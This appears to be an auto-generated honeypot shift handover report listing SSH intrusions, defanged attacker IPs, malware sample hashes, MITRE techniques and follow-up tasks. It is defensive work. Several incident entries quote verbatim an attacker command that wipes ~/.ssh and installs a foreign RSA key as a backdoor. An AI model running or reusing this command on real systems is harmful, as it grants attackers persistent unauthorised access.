| Field | Detail |
|---|---|
| **Source IP** | `147.45.174[.]46` |
| **First Seen** | 2026-05-04 13:12 |
| **Last Seen** | 2026-05-04 13:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 13:12:03` | `cowrie.session.connect` |
| `2026-05-04 13:12:03` | `cowrie.client.version` |
| `2026-05-04 13:12:03` | `cowrie.client.kex` |
| `2026-05-04 13:12:03` | `cowrie.login.success` |
| `2026-05-04 13:12:04` | `cowrie.session.params` |
| `2026-05-04 13:12:04` | `cowrie.command.input` |
| `2026-05-04 13:12:04` | `cowrie.command.failed` |
| `2026-05-04 13:12:04` | `cowrie.log.closed` |
| `2026-05-04 13:12:04` | `cowrie.session.params` |
| `2026-05-04 13:12:04` | `cowrie.command.input` |
| `2026-05-04 13:12:04` | `cowrie.session.file_download` |
| `2026-05-04 13:12:04` | `cowrie.log.closed` |
| `2026-05-04 13:12:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.45.174[.]46` to AbuseIPDB if not already reported
- [ ] Block `147.45.174[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16a83f092896

| Field | Detail |
|---|---|
| **Source IP** | `147.45.174[.]46` |
| **First Seen** | 2026-05-04 13:12 |
| **Last Seen** | 2026-05-04 13:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 13:12:06` | `cowrie.session.connect` |
| `2026-05-04 13:12:06` | `cowrie.client.version` |
| `2026-05-04 13:12:07` | `cowrie.client.kex` |
| `2026-05-04 13:12:07` | `cowrie.login.success` |
| `2026-05-04 13:12:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.45.174[.]46` to AbuseIPDB if not already reported
- [ ] Block `147.45.174[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98603a3917c8

| Field | Detail |
|---|---|
| **Source IP** | `147.45.174[.]46` |
| **First Seen** | 2026-05-04 13:19 |
| **Last Seen** | 2026-05-04 13:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 13:19:44` | `cowrie.session.connect` |
| `2026-05-04 13:19:44` | `cowrie.client.version` |
| `2026-05-04 13:19:44` | `cowrie.client.kex` |
| `2026-05-04 13:19:44` | `cowrie.login.success` |
| `2026-05-04 13:19:45` | `cowrie.session.params` |
| `2026-05-04 13:19:45` | `cowrie.command.input` |
| `2026-05-04 13:19:45` | `cowrie.command.failed` |
| `2026-05-04 13:19:45` | `cowrie.log.closed` |
| `2026-05-04 13:19:45` | `cowrie.session.params` |
| `2026-05-04 13:19:45` | `cowrie.command.input` |
| `2026-05-04 13:19:45` | `cowrie.session.file_download` |
| `2026-05-04 13:19:45` | `cowrie.log.closed` |
| `2026-05-04 13:19:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.45.174[.]46` to AbuseIPDB if not already reported
- [ ] Block `147.45.174[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c23c09402f8c

| Field | Detail |
|---|---|
| **Source IP** | `147.45.174[.]46` |
| **First Seen** | 2026-05-04 13:19 |
| **Last Seen** | 2026-05-04 13:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 13:19:47` | `cowrie.session.connect` |
| `2026-05-04 13:19:47` | `cowrie.client.version` |
| `2026-05-04 13:19:47` | `cowrie.client.kex` |
| `2026-05-04 13:19:48` | `cowrie.login.success` |
| `2026-05-04 13:19:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `147.45.174[.]46` to AbuseIPDB if not already reported
- [ ] Block `147.45.174[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-878906b5de62

| Field | Detail |
|---|---|
| **Source IP** | `185.71.233[.]73` |
| **First Seen** | 2026-05-04 13:30 |
| **Last Seen** | 2026-05-04 13:31 |
| **Session Duration** | 38s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `?, apt-get update -y, sudo apt-get update -y, root` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 13:30:42` | `cowrie.session.connect` |
| `2026-05-04 13:30:42` | `cowrie.client.version` |
| `2026-05-04 13:30:42` | `cowrie.client.kex` |
| `2026-05-04 13:30:44` | `cowrie.login.success` |
| `2026-05-04 13:30:44` | `cowrie.client.size` |
| `2026-05-04 13:30:45` | `cowrie.session.params` |
| `2026-05-04 13:30:46` | `cowrie.command.input` |
| `2026-05-04 13:30:46` | `cowrie.command.failed` |
| `2026-05-04 13:30:46` | `cowrie.command.input` |
| `2026-05-04 13:30:46` | `cowrie.command.input` |
| `2026-05-04 13:30:47` | `cowrie.command.input` |
| `2026-05-04 13:31:03` | `cowrie.command.input` |
| `2026-05-04 13:31:05` | `cowrie.command.input` |
| `2026-05-04 13:31:05` | `cowrie.command.failed` |
| `2026-05-04 13:31:20` | `cowrie.log.closed` |
| `2026-05-04 13:31:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.71.233[.]73` to AbuseIPDB if not already reported
- [ ] Block `185.71.233[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfccf65853b4

| Field | Detail |
|---|---|
| **Source IP** | `4.211.84[.]189` |
| **First Seen** | 2026-05-04 13:33 |
| **Last Seen** | 2026-05-04 13:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 13:33:21` | `cowrie.session.connect` |
| `2026-05-04 13:33:21` | `cowrie.client.version` |
| `2026-05-04 13:33:21` | `cowrie.client.kex` |
| `2026-05-04 13:33:21` | `cowrie.login.success` |
| `2026-05-04 13:33:22` | `cowrie.session.params` |
| `2026-05-04 13:33:22` | `cowrie.command.input` |
| `2026-05-04 13:33:22` | `cowrie.command.failed` |
| `2026-05-04 13:33:22` | `cowrie.log.closed` |
| `2026-05-04 13:33:22` | `cowrie.session.params` |
| `2026-05-04 13:33:22` | `cowrie.command.input` |
| `2026-05-04 13:33:22` | `cowrie.session.file_download` |
| `2026-05-04 13:33:22` | `cowrie.log.closed` |
| `2026-05-04 13:33:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.211.84[.]189` to AbuseIPDB if not already reported
- [ ] Block `4.211.84[.]189` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cac9abc2cd2

| Field | Detail |
|---|---|
| **Source IP** | `4.211.84[.]189` |
| **First Seen** | 2026-05-04 13:33 |
| **Last Seen** | 2026-05-04 13:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-04 13:33:24` | `cowrie.session.connect` |
| `2026-05-04 13:33:24` | `cowrie.client.version` |
| `2026-05-04 13:33:24` | `cowrie.client.kex` |
| `2026-05-04 13:33:25` | `cowrie.login.success` |
| `2026-05-04 13:33:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.211.84[.]189` to AbuseIPDB if not already reported
- [ ] Block `4.211.84[.]189` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `68.235.37[.]43` | **1858** | 2026-05-04 10:30 | 2026-05-04 11:54 | 1055m | 0 | `T1592` | 🟠 MEDIUM |
| `147.45.174[.]46` | **30** | 2026-05-04 13:00 | 2026-05-04 13:28 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `154.219.97[.]211` | **30** | 2026-05-04 10:52 | 2026-05-04 11:37 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `210.3.66[.]51` | **30** | 2026-05-04 12:45 | 2026-05-04 12:48 | 15m | 0 | `T1592` | 🟠 MEDIUM |
| `103.140.54[.]85` | **24** | 2026-05-04 11:14 | 2026-05-04 11:21 | 12m | 0 | `T1592` | 🟠 MEDIUM |
| `161.132.52[.]19` | **7** | 2026-05-04 10:26 | 2026-05-04 13:54 | 4m | 0 | `T1592` | 🟢 LOW |
| `216.131.76[.]119` | **7** | 2026-05-04 13:22 | 2026-05-04 13:33 | 14m | 0 | `T1592` | 🟢 LOW |
| `8.216.5[.]114` | **3** | 2026-05-04 10:54 | 2026-05-04 10:55 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `149.28.100[.]59` | **2** | 2026-05-04 10:21 | 2026-05-04 10:36 | 1m | 0 | `T1592` | 🟢 LOW |
| `183.136.170[.]167` | **2** | 2026-05-04 13:03 | 2026-05-04 13:05 | 2m | 0 | `T1592` | 🟢 LOW |
| `101.126.157[.]138` | 1 | 2026-05-04 12:43 | 2026-05-04 12:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `109.51.15[.]184` | 1 | 2026-05-04 13:27 | 2026-05-04 13:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `110.93.219[.]131` | 1 | 2026-05-04 13:36 | 2026-05-04 13:36 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.145.213[.]116` | 1 | 2026-05-04 10:58 | 2026-05-04 11:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]120` | 1 | 2026-05-04 12:42 | 2026-05-04 12:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `20.115.99[.]68` | 1 | 2026-05-04 11:27 | 2026-05-04 11:28 | 30s | 0 | `T1592` | 🟢 LOW |
| `4.211.84[.]189` | 1 | 2026-05-04 13:33 | 2026-05-04 13:33 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `46.32.255[.]48` | 1 | 2026-05-04 12:18 | 2026-05-04 12:18 | 31s | 0 | `T1592` | 🟢 LOW |
| `52.70.205[.]193` | 1 | 2026-05-04 12:57 | 2026-05-04 12:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.233.194[.]35` | 1 | 2026-05-04 13:29 | 2026-05-04 13:29 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (26 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 40/100 | 🟡 MEDIUM | **26/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 10/100 | 🟢 LOW | **27/74** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `20.115.99[.]68` | US | Microsoft Corporation | **100** ⚠️ | 26 |
| `52.70.205[.]193` | US | Amazon Technologies Inc. | **100** ⚠️ | 23 |
| `210.3.66[.]51` | HK | HGC Global Communications Limited | **100** ⚠️ | 1 |
| `89.233.194[.]35` | SE | Bredband2 AB | **100** ⚠️ | 8 |
| `103.140.54[.]85` | ID | CV. RUMAH CLOUD INDONESIA | **100** ⚠️ | 1 |
| `118.145.213[.]116` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 12 |
| `147.45.174[.]46` | NL | Timeweb, LLP | **100** ⚠️ | 0 |
| `110.93.219[.]131` | PK | Transworld Associates (Pvt.) Ltd. | **100** ⚠️ | 15 |
| `101.126.157[.]138` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 49 |
| `149.28.100[.]59` | US | Vultr Holdings, LLC | **100** ⚠️ | 3 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 120 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 63 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 53 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 26 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 26 |

---

## 🔕 False Positive Summary (51 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 9 |
| AbuseIPDB score 16 below threshold 25 | 3 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 25 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 12 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 2107 cases |
| Tool 34  | Credential Extractor        | ✅ 117 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 42 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 51 filtered (2.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 36 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 26 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 53 priority case(s) shown individually · 20 recon entry/entries in table (10 group(s) consolidating 1993 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-04T14:10:43Z_
